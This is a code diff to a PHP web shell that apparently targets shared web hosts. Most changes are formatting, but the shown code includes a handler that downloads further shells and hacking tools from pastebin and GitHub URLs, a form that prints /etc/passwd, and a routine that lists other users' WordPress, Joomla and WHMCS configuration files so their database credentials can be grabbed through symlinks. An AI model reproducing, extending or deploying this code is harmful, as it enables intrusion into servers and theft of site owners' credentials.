@@ -531,7 +531,7 @@ function CreateTools($names, $lokasi) {
 if (isset($_GET['make_love'])) {
     $tools = [
         "wso404" => "https://pastebin.com/raw/BMTGUY6J",
-        "obfuscator" => "https://raw.githubusercontent.com/mrxbarakuda/paste/refs/heads/main/obfuscator.txt",
+        "obfuscator" => "https://raw.githubusercontent.com/Anon-Exploiter/Php-Obfuscation-Tool/refs/heads/master/obfuscator.php",
         "noname" => "https://pastebin.com/raw/NXidmXn5",
         "blackhat" => "https://raw.githubusercontent.com/SurabayaBlackhat/sbh-shell/master/Shell-v.2.5.php",
         "sqlscan" => "https://pastebin.com/raw/3jwmYBzc",
@@ -2027,6 +2027,7 @@ elseif ($_GET['do'] == 'configv2') {
             fwrite($htc, $isi_htc);
             fclose($htc);
         }
+
         $full = str_replace($_SERVER['DOCUMENT_ROOT'], "", $dir);
         $passwd = $_POST['passwd'];
         preg_match_all('/(.*?):x:/', $passwd, $user_config);
@@ -2075,7 +2076,7 @@ elseif ($_GET['do'] == 'configv2') {
                 "/home/$user_kuda/public_html/blogs/wp-config.php" => "Wordpress",
                 "/home/$user_kuda/public_html/configuration.php" => "Joomla",
                 "/home/$user_kuda/public_html/blog/configuration.php" => "Joomla",
-                "/home/$user_kuda/public_html/submitticket.php" => "^WHMCS",
+                "/home/$user_kuda/public_html/submitticket.php" => "WHMCS",
                 "/home/$user_kuda/public_html/cms/configuration.php" => "Joomla",
                 "/home/$user_kuda/public_html/beta/configuration.php" => "Joomla",
                 "/home/$user_kuda/public_html/portal/configuration.php" => "Joomla",
@@ -2539,33 +2540,33 @@ elseif ($_GET['do'] == 'configv2') {
             }
 
             if ($_POST['config'] == '404') {
-                echo "<center><a href='".$full."/kuda_sym404/root/'><font color='lime'>Symlinknya</font></a><br><a href='".$full."/kuda_sym404/' target='_blank'><font color='lime'>Configurations</font></a></center>";
+                echo "<center><a href='" . $full . "/kuda_sym404/root/'><font color='lime'>Symlinknya</font></a><br><a href='" . $full . "/kuda_sym404/' target='_blank'><font color='lime'>Configurations</font></a></center>";
             }
 
             if ($_POST['config'] == 'symlink') {
-                echo "<center><a href='".$full."/kuda_symconfig/root/'><font color='lime'>Symlinknya</font></a><br><a href='".$full."/kuda_symconfig/' target='_blank'><font color='lime'>Configurations</font></a></center>";
+                echo "<center><a href='" . $full . "/kuda_symconfig/root/'><font color='lime'>Symlinknya</font></a><br><a href='" . $full . "/kuda_symconfig/' target='_blank'><font color='lime'>Configurations</font></a></center>";
             }
 
-            if ($_POST['config'] == 'symvhost') {
-                echo "<center><a href='".$full."/kuda_symvhost/root/'><font color='lime'>Symlink Vhost</font></a><br><a href='".$full."/kuda_symvhost/' target='_blank'><font color='lime'>Configurations</font></a></center>";
+            if ($_POST['config'] == 'symvhosts') {
+                echo "<center><a href='" . $full . "/kuda_symvhosts/root/'><font color='lime'>Symlink Vhost</font></a><br><a href='" . $full . "/kuda_symvhosts/' target='_blank'><font color='lime'>Configurations</font></a></center>";
             }
         }
     } else {
-echo "<form method='post' action=''>";
-echo "<center>";
-echo "<textarea name='passwd' class='area' rows='15' cols='60'>";
-echo include("/etc/passwd");
-echo "</textarea>";
-echo "<br>";
-echo "<select class='select' name='config' style='width: 450px;'>";
-echo "<option value='grab'>Config Grab</option>";
-echo "<option value='symlink'>Symlink Config</option>";
-echo "<option value='404'>Config 404</option>";
-echo "<option value='symvhosts'>Vhosts Config Grabber</option>";
-echo "</select>";
-echo "<input type='submit' value='Start!'>";
-echo "</center>";
-echo "</form>";
+        echo "<form method='post' action=''>";
+        echo "<center>";
+        echo "<textarea name='passwd' class='area' rows='15' cols='60'>";
+        echo include("/etc/passwd");
+        echo "</textarea>";
+        echo "<br>";
+        echo "<select class='select' name='config' style='width: 450px;'>";
+        echo "<option value='grab'>Config Grab</option>";
+        echo "<option value='symlink'>Symlink Config</option>";
+        echo "<option value='404'>Config 404</option>";
+        echo "<option value='symvhosts'>Vhosts Config Grabber</option>";
+        echo "</select>";
+        echo "<input type='submit' value='Start!'>";
+        echo "</center>";
+        echo "</form>";
     }
 }
 elseif ($_GET['do'] == 'drupalex') {
